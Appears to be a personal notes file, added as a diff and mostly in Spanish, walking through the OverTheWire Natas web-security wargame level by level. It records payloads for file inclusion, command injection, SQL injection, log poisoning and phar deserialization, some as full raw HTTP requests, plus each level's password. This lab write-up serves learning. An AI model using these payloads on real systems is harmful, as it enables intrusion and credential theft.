@@ -1,0 +1,218 @@
+----------------------------------------------------------------------------------------------------------------------------------------Las intrucciones corresponde a la url anterior es decir, como se obtuvo la contraseña del nivel actual.
+----------------------------------------------------------------------------------------------------------------------------------------
+0
+http://natas0.natas.labs.overthewire.org
+natas0 / natas0
+http://natas1.natas.labs.overthewire.org
+natas1 gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+http://natas2.natas.labs.overthewire.org
+natas2 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+http://natas3.natas.labs.overthewire.org
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+http://natas4.natas.labs.overthewire.org -> robots.txt
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+http://natas5.natas.labs.overthewire.org -> burp y referal en los headers
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
+
+http://natas6.natas.labs.overthewire.org -> cookies
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+http://natas7.natas.labs.overthewire.org -> check directories
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+http://natas8.natas.labs.overthewire.org -> RremotaFI / LocalFI vulnerability
+						index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
+
+http://natas9.natas.labs.overthewire.org -> origen,base64,reverse,bin,hex
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+http://natas10.natas.labs.overthewire.org -> passthru method ejecuta comandos -> 
+						Busqueda = test; cat /etc/natas_webpass/natas10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+http://natas11.natas.labs.overthewire.org -> use grep "u /etc/natas_webpass/natas11"
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+http://natas12.natas.labs.overthewire.org 
+
+Original_Data XOR KEY = Encrypted_Data
+The following is also true:
+Original_Data XOR Encrypted_Data = KEY
+
+php code (angry face) => qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+decrypt following code
+and edit cookie
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+http://natas13.natas.labs.overthewire.org -> cat.php, upload and change the html (no validation!)
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+http://natas14.natas.labs.overthewire.org -> cat.php, upload and change the html (null byte in the 							first part)hexeditor -b cat.png and copy the 							header of the jpg's
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+http://natas15.natas.labs.overthewire.org -> user=a ; pass = " or "1"="1
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+http://natas16.natas.labs.overthewire.org -> CommandInjection-grep-natas16.py to an user natas16
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+ 
+http://natas17.natas.labs.overthewire.org -> mismo que el anterior pero con $doomed(grep...)
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+http://natas18.natas.labs.overthewire.org -> igual que 16 pero con sleep y format char
+xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+http://natas19.natas.labs.overthewire.org -> SessionIdentifier.py
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+http://natas20.natas.labs.overthewire.org -> SessionIdentifierNonsecuential.py
+
+no user no pass -> 3234332d, 3539362d, 3139342d
+admin		-> 343932 2d 61646d696e
+admin admin     -> 3135   2d 61646d696e
+
+eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+http://natas21.natas.labs.overthewire.org -> WriteVulne-natas21.py
+
+IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+http://natas22.natas.labs.overthewire.org
+use and get the cookie
+http://natas21experimenter.natas.labs.overthewire.org/index.php?submit&admin=1 
+
+chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+http://natas23.natas.labs.overthewire.org
+Go revelia and check the response in the burp
+D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+http://natas24.natas.labs.overthewire.org -> 11iloveyou
+
+OsRmXFguozKpTZZ5X14zNO43379LZveg
+http://natas25.natas.labs.overthewire.org -> ?passwd[]=0 -> array exception
+
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+http://natas26.natas.labs.overthewire.org
+
+GET /?lang=....//logs/natas25_SP.log HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+User-Agent: <? include "/etc/natas_webpass/natas26" ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Connection: close
+Cookie: PHPSESSID=SP
+Upgrade-Insecure-Requests: 1
+Referer: http://natas25.natas.labs.overthewire.org/
+
+oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+http://natas27.natas.labs.overthewire.org -> ObjectInjection.php
+Tried to replicate it unsuccesfully, looks weird
+
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+http://natas28.natas.labs.overthewire.org
+Use burp repeater and use: username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++hi&password=
+this insert another pass for the natas28 user
+
+JWwR438wkgTsNKBbcJoowyysdM82YjeF
+http://natas29.natas.labs.overthewire.org 
+hardest level
+use PKCS#7 and SQL injection.py
+
+airooCaiseiyee8he8xongien9euhe8b
+
+http://natas30.natas.labs.overthewire.org 
+Usar: natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na""tas_webpass/nata""s30%3b
+
+wie9iexae0Daihohv8vuu3cei9wahf0e
+
+http://natas31.natas.labs.overthewire.org
+
+password: ["1 or '1'='1'", 2] -> PerlSQLInjection.py
+hay7aecuungiuKaezuathuk9biin0pu1
+
+http://natas32.natas.labs.overthewire.org
+
+upload natas31:
+POST /index.pl/?cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Content-Type: multipart/form-data; boundary=---------------------------18173567112753749251541913243
+Content-Length: 336
+Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
+Connection: close
+Cookie: __utma=176859643.1003345129.1581511320.1581550855.1581717705.4; __utmz=176859643.1581717705.4.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643
+Upgrade-Insecure-Requests: 1
+
+-----------------------------18173567112753749251541913243
+Content-Disposition: form-data; name="file"
+Content-Type: text/plain
+
+ARGV
+-----------------------------18173567112753749251541913243
+Content-Disposition: form-data; name="file"; filename="natas31.csv"
+Content-Type: text/csv
+
+
+-----------------------------18173567112753749251541913243
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------18173567112753749251541913243--
+
+no1vohsheCaiv3ieH4em1ahchisainge
+
+http://natas33.natas.labs.overthewire.org/
+POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas32.natas.labs.overthewire.org/
+Content-Type: multipart/form-data; boundary=---------------------------112141207710001553252136899520
+Content-Length: 339
+Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
+Connection: close
+Cookie: __utma=176859643.1003345129.1581511320.1581550855.1581717705.4; __utmz=176859643.1581717705.4.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643
+Upgrade-Insecure-Requests: 1
+
+-----------------------------112141207710001553252136899520
+Content-Disposition: form-data; name="file"
+Content-Type: text/plain
+
+ARGV
+-----------------------------112141207710001553252136899520
+Content-Disposition: form-data; name="file"; filename="natas32.csv"
+Content-Type: text/csv
+
+
+-----------------------------112141207710001553252136899520
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------112141207710001553252136899520--
+
+shoogeiGa2yee3de6Aex8uaXeech5eey
+
+Final:
+Quitas pharreadonly del /etc/php/7.3/php.ini
+ejecutar test.php
+subes pwn.php y pwn.phar (cambian la request para que no te ponga otro nombre)
+vuelves a mandar el phar con el nombre phar://pwn.phar/pwn.txt
+
+shu5ouSu6eicielahhae0mohd4ui5uig
+
+
+
